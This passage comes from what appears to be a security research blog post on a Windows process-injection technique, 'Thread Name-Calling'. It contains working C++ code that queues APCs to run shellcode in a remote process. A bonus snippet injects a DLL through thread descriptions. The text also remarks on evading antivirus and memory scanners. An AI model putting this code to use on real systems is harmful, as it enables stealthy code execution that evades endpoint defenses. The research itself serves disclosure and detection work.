class="enlighter-k4">#ifdef USE_NEW_BUFFER</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    shellcodePtr = </span><span class="enlighter-m0">VirtualAllocEx</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, </span><span class="enlighter-k0">nullptr</span><span class="enlighter-text">, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!shellcodePtr</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Failed to allocate!"</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::hex </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-m0">GetLastError</span><span class="enlighter-g1">()</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Allocated: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::hex </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> shellcodePtr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">void</span><span class="enlighter-text">* _RtlMoveMemoryPtr = </span><span class="enlighter-m0">GetProcAddress</span><span class="enlighter-g1">(</span><span class="enlighter-m0">GetModuleHandle</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ntdll.dll"</span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span><span class="enlighter-s0">"RtlMoveMemory"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!_RtlMoveMemoryPtr</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cerr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Failed retrieving: _RtlMoveMemoryPtr\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!</span><span class="enlighter-m0">queue_apc_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread, _RtlMoveMemoryPtr, shellcodePtr, remotePtr, </span><span class="enlighter-g1">(</span><span class="enlighter-k5">void</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-text">payload_len</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Added RtlMoveMemory to the thread queue!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    DWORD oldProtect = 0;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!</span><span class="enlighter-m0">VirtualProtectEx</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, shellcodePtr, payload_len, PAGE_EXECUTE_READWRITE, &amp;oldProtect</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Failed to protect!"</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::hex </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-m0">GetLastError</span><span class="enlighter-g1">()</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Protection changed! Old: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::hex </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> oldProtect </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#endif</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">bool</span><span class="enlighter-text"> isOk = </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">auto</span><span class="enlighter-text"> _RtlDispatchAPC = </span><span class="enlighter-m0">GetProcAddress</span><span class="enlighter-g1">(</span><span class="enlighter-m0">GetModuleHandle</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ntdll.dll"</span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span><span class="enlighter-m0">MAKEINTRESOURCE</span><span class="enlighter-g1">(</span><span class="enlighter-text">8</span><span class="enlighter-g1">))</span><span class="enlighter-text">; </span><span class="enlighter-c0">//RtlDispatchAPC;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">_RtlDispatchAPC</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Using RtlDispatchAPC\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">queue_apc_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread, _RtlDispatchAPC, shellcodePtr, 0, </span><span class="enlighter-g1">(</span><span class="enlighter-k5">void</span><span class="enlighter-text">*</span><span class="enlighter-g1">)(</span><span class="enlighter-text">-1</span><span class="enlighter-g1">)))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            isOk = </span><span class="enlighter-e0">true</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">else</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">queue_apc_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread, shellcodePtr, 0, 0, 0</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            isOk = </span><span class="enlighter-e0">true</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">isOk</span><span class="enlighter-g1">)</span><span class="enlighter-text"> std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Added to the thread queue!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#ifndef USE_EXISTING_THREAD</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">ResumeThread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#endif</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">CloseHandle</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> isOk;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">bool run_injected(HANDLE hProcess, void* remotePtr, size_t payload_len)
{
    void* shellcodePtr = remotePtr;
#ifdef USE_EXISTING_THREAD
    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT);
#else
    HANDLE hThread = create_alertable_thread(hProcess);
#endif
    if (!hThread || hThread == INVALID_HANDLE_VALUE) {
        std::cerr &lt;&lt; "Invalid thread handle!\n";
        return false;
    }
#ifdef USE_NEW_BUFFER
    shellcodePtr = VirtualAllocEx(hProcess, nullptr, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcodePtr) {
        std::cout &lt;&lt; "Failed to allocate!" &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
        return false;
    }
    std::cout &lt;&lt; "Allocated: " &lt;&lt; std::hex &lt;&lt; shellcodePtr &lt;&lt; "\n";
    void* _RtlMoveMemoryPtr = GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlMoveMemory");
    if (!_RtlMoveMemoryPtr) {
        std::cerr &lt;&lt; "Failed retrieving: _RtlMoveMemoryPtr\n";
        return false;
    }
    if (!queue_apc_thread(hThread, _RtlMoveMemoryPtr, shellcodePtr, remotePtr, (void*)payload_len)) {
        return false;
    }
    std::cout &lt;&lt; "Added RtlMoveMemory to the thread queue!\n";
#else
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, shellcodePtr, payload_len, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) {
        std::cout &lt;&lt; "Failed to protect!" &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
        return false;
    }
    std::cout &lt;&lt; "Protection changed! Old: " &lt;&lt; std::hex &lt;&lt; oldProtect &lt;&lt; "\n";
#endif
    bool isOk = false;
    auto _RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;
    if (_RtlDispatchAPC) {
        std::cout &lt;&lt; "Using RtlDispatchAPC\n";
        if (queue_apc_thread(hThread, _RtlDispatchAPC, shellcodePtr, 0, (void*)(-1))) {
            isOk = true;
        }
    }
    else {
        if (queue_apc_thread(hThread, shellcodePtr, 0, 0, 0)) {
            isOk = true;
        }
    }
    if (isOk) std::cout &lt;&lt; "Added to the thread queue!\n";
#ifndef USE_EXISTING_THREAD
    ResumeThread(hThread);
#endif
    CloseHandle(hThread);
    return isOk;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">bool run_injected(HANDLE hProcess, void* remotePtr, size_t payload_len)
{
    void* shellcodePtr = remotePtr;
#ifdef USE_EXISTING_THREAD
    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT);
#else
    HANDLE hThread = create_alertable_thread(hProcess);
#endif
    if (!hThread || hThread == INVALID_HANDLE_VALUE) {
        std::cerr &lt;&lt; "Invalid thread handle!\n";
        return false;
    }
#ifdef USE_NEW_BUFFER
    shellcodePtr = VirtualAllocEx(hProcess, nullptr, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcodePtr) {
        std::cout &lt;&lt; "Failed to allocate!" &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
        return false;
    }
    std::cout &lt;&lt; "Allocated: " &lt;&lt; std::hex &lt;&lt; shellcodePtr &lt;&lt; "\n";
    void* _RtlMoveMemoryPtr = GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlMoveMemory");
    if (!_RtlMoveMemoryPtr) {
        std::cerr &lt;&lt; "Failed retrieving: _RtlMoveMemoryPtr\n";
        return false;
    }
    if (!queue_apc_thread(hThread, _RtlMoveMemoryPtr, shellcodePtr, remotePtr, (void*)payload_len)) {
        return false;
    }
    std::cout &lt;&lt; "Added RtlMoveMemory to the thread queue!\n";
#else
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, shellcodePtr, payload_len, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) {
        std::cout &lt;&lt; "Failed to protect!" &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
        return false;
    }
    std::cout &lt;&lt; "Protection changed! Old: " &lt;&lt; std::hex &lt;&lt; oldProtect &lt;&lt; "\n";
#endif
    bool isOk = false;
    auto _RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;
    if (_RtlDispatchAPC) {
        std::cout &lt;&lt; "Using RtlDispatchAPC\n";
        if (queue_apc_thread(hThread, _RtlDispatchAPC, shellcodePtr, 0, (void*)(-1))) {
            isOk = true;
        }
    }
    else {
        if (queue_apc_thread(hThread, shellcodePtr, 0, 0, 0)) {
            isOk = true;
        }
    }
    if (isOk) std::cout &lt;&lt; "Added to the thread queue!\n";
#ifndef USE_EXISTING_THREAD
    ResumeThread(hThread);
#endif
    CloseHandle(hThread);
    return isOk;
}</pre>



<p class="wp-block-paragraph">And it works!</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="wp-block-paragraph"><em><strong>See in action</strong></em></p>



<p class="wp-block-paragraph">Video demo:&nbsp;<a href="https://youtu.be/1BJaxHh91p4">https://youtu.be/1BJaxHh91p4</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2024/07/TXYQKLGPF9-rId99.png" alt="Figure 3 - Demo of the Thread Name-Calling: the code injected into
mspaint.exe executed a new process: calc.exe"><figcaption class="wp-element-caption">Figure 3 – Demo of the Thread Name-Calling: the code injected into mspaint.exe executed a new process: calc.exe</figcaption></figure>
</div>


<p class="wp-block-paragraph">As we found during our tests, although we call the potentially suspicious API (<code>VirtualProtectEx</code> or <code>VirtualAllocEx</code> ), for most of the products this indicator alone was not enough to flag the payload: it is was not registered that we are using an injected buffer.</p>



<h3 class="wp-block-heading" id="room-for-improvements">Known limitations and field for improvements</h3>



<p class="wp-block-paragraph">During our research, we assessed several different methods of making the injected buffer executable. Unfortunately, each of those methods has its flaws. The most straight-forward way is by the API that operates on the process, such as <code>VirtualProtectEx</code> or <code>VirtualAllocEx</code> – but, using those functions may draw unwanted attention. The alternative is calling functions <code>VirtualProtect</code> or <code>VirtualAlloc</code> remotely, via ROP – however, this involves a set of APIs that are even more suspicious, so we decided to stick with the simpler alternative.</p>



<p class="wp-block-paragraph">The presence of the page with RWX access rights is another indicator that will be quickly picked up by memory scanners. Using just a few more calls, we can easily implement a scenario where we allocate a new memory region with Read/Write access, copy there the injected buffer, and then change it to Read/eXecute. Also, once we have our code executed within the context of a remote process, nothing stops us from pivoting further, allocating additional memory within it (as long as the process does not use DCP policy), and moving the payload, changing the access rights back to the initial ones.</p>



<p class="wp-block-paragraph">If needed, we can also further reduce access rights with which the process has to be opened, as described at the beginning of the chapter.</p>



<h2 class="wp-block-heading" id="bonus-dll-injection-using-thread-name">Bonus: DLL injection using Thread Name</h2>



<p class="wp-block-paragraph"><a href="https://attack.mitre.org/techniques/T1055/001/">DLL injection is one of the well-known techniques</a>&nbsp;of augmenting a running process with our code. It is not a particularly stealthy technique, because it calls&nbsp;<code>LoadLibrary</code>&nbsp;on the payload (DLL) which has to be first dropped on the disk. In addition, the sole fact of loading a PE via standard API generates a kernel callback which can be used for detection. Nevertheless, it is one of the simple techniques that can be useful in some cases, and it is worthwhile to have in our arsenal.</p>



<p class="wp-block-paragraph">Typical implementation of DLL injection involves:</p>



<ol class="wp-block-list">
<li><code>VirtualAllocEx</code>&nbsp;– to allocate memory for a DLL path within the remote process</li>



<li><code>WriteProcessMemory</code>&nbsp;– to write the path into the allocated memory</li>



<li><code>CreateRemoteThread</code>&nbsp;(or equivalents) – to call&nbsp;<code>LoadLibrary</code>&nbsp;remotely (passing it the pointer to the written path). Some variants may involve running the&nbsp;<code>LoadLibrary</code>&nbsp;via APC instead of the new thread.</li>
</ol>



<p class="wp-block-paragraph">In this section we propose an alternative implementation, that does not require write access right to the target process, and involves non-standard APIs:</p>



<ol class="wp-block-list">
<li><code>SetThreadDescription</code>&nbsp;+&nbsp;<code>NtQueueApcThreadEx2</code>&nbsp;with&nbsp;<code>GetThreadDescription</code>&nbsp;– for remote memory allocation + writing the path to the remote process</li>



<li><code>NtQueueApcThreadEx2</code>&nbsp;– to call&nbsp;<code>LoadLibrary</code>&nbsp;remotely (but of course we can also use a new thread, like in the classic implementation)</li>
</ol>



<p class="wp-block-paragraph">The first step can be implemented exactly as in the Thread Name-Calling implementation (described under: ”Remote write with the help of thread description”). Snippet:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k8">const</span><span class="enlighter-text"> wchar_t* buf = dllName.</span><span class="enlighter-m3">c_str</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">void</span><span class="enlighter-text">* remotePtr = </span><span class="enlighter-m0">get_peb_unused</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    wchar_t* wPtr = </span><span class="enlighter-m0">pass_via_thread_name</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, buf, remotePtr</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">    const wchar_t* buf = dllName.c_str();
    void* remotePtr = get_peb_unused(hProcess);
    wchar_t* wPtr = pass_via_thread_name(hProcess, buf, remotePtr);</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">    const wchar_t* buf = dllName.c_str();
    void* remotePtr = get_peb_unused(hProcess);
    wchar_t* wPtr = pass_via_thread_name(hProcess, buf, remotePtr);</pre>



<p class="wp-block-paragraph">In contrast to Thread Name-Calling, we don’t have to change the access rights to our injected buffer, so the second step is very simple.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k5">bool</span><span class="enlighter-text"> </span><span class="enlighter-m0">inject_with_loadlibrary</span><span class="enlighter-g1">(</span><span class="enlighter-text">HANDLE hProcess, PVOID remote_ptr</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HANDLE hThread = </span><span class="enlighter-m0">find_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, THREAD_SET_CONTEXT</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">bool</span><span class="enlighter-text"> isOk = </span><span class="enlighter-m0">queue_apc_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread, LoadLibraryW, remote_ptr, 0, 0</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">CloseHandle</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> isOk;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">bool inject_with_loadlibrary(HANDLE hProcess, PVOID remote_ptr)
{
    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT);
    bool isOk = queue_apc_thread(hThread, LoadLibraryW, remote_ptr, 0, 0);
    CloseHandle(hThread);
    return isOk;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">bool inject_with_loadlibrary(HANDLE hProcess, PVOID remote_ptr)
{
    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT);
    bool isOk = queue_apc_thread(hThread, LoadLibraryW, remote_ptr, 0, 0);
    CloseHandle(hThread);
    return isOk;
}</pre>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="wp-block-paragraph"><em><strong>See in action</strong></em></p>



<p class="wp-block-paragraph">Video demo:&nbsp;<a href="https://youtu.be/8cSNgE3gZxY">https://youtu.be/8cSNgE3gZxY</a></p>
</blockquote>



<h2 class="wp-block-heading" id="the-tested-target">The tested targets</h2>



<p class="wp-block-paragraph">The described techniques were tested on Windows 10, and Windows 11. List of the tested versions:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-generic enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">Version </span><span class="enlighter-n0">10.0</span><span class="enlighter-text">.</span><span class="enlighter-m3">19045</span><span class="enlighter-text"> Build </span><span class="enlighter-m0">19045</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">Windows </span><span class="enlighter-n1">10</span><span class="enlighter-text"> Enterprise, </span><span class="enlighter-n1">64</span><span class="enlighter-text"> bit</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Version </span><span class="enlighter-n0">10.0</span><span class="enlighter-text">.</span><span class="enlighter-m3">22621</span><span class="enlighter-text"> Build </span><span class="enlighter-m0">22000</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">Windows </span><span class="enlighter-n1">11</span><span class="enlighter-text"> Pro, </span><span class="enlighter-n1">64</span><span class="enlighter-text"> bit</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Version </span><span class="enlighter-n0">10.0</span><span class="enlighter-text">.</span><span class="enlighter-m3">22621</span><span class="enlighter-text"> Build </span><span class="enlighter-m0">22621</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">Windows </span><span class="enlighter-n1">11</span><span class="enlighter-text"> Pro, </span><span class="enlighter-n1">64</span><span class="enlighter-text"> bit - Windows </span><span class="enlighter-n1">11</span><span class="enlighter-text"> v22H2</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Version </span><span class="enlighter-n0">10.0</span><span class="enlighter-text">.</span><span class="enlighter-m3">22631</span><span class="enlighter-text"> Build </span><span class="enlighter-m0">22631</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">Windows </span><span class="enlighter-n1">11</span><span class="enlighter-text"> Pro, </span><span class="enlighter-n1">64</span><span class="enlighter-text"> bit - Windows </span><span class="enlighter-n1">11</span><span class="enlighter-text"> v23H2</span><span class="enlighter-g1">)</span></div></div></div><div class="enlighter-raw">Version 10.0.19045 Build 19045 (Windows 10 Enterprise, 64 bit)
Version 10.0.22621 Build 22000 (Windows 11 Pro, 64 bit)
Version 10.0.22621 Build 22621 (Windows 11 Pro, 64 bit - Windows 11 v22H2)
Version 10.0.22631 Build 22631 (Windows 11 Pro, 64 bit - Windows 11 v23H2)</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Version 10.0.19045 Build 19045 (Windows 10 Enterprise, 64 bit)
Version 10.0.22621 Build 22000 (Windows 11 Pro, 64 bit)
Version 10.0.22621 Build 22621 (Windows 11 Pro, 64 bit - Windows 11 v22H2)
Version 10.0.22631 Build 22631 (Windows 11 Pro, 64 bit - Windows 11 v23H2)</pre>



<p class="wp-block-paragraph">The intended target is a 64-bit process. The following mitigation policies may be set:</p>



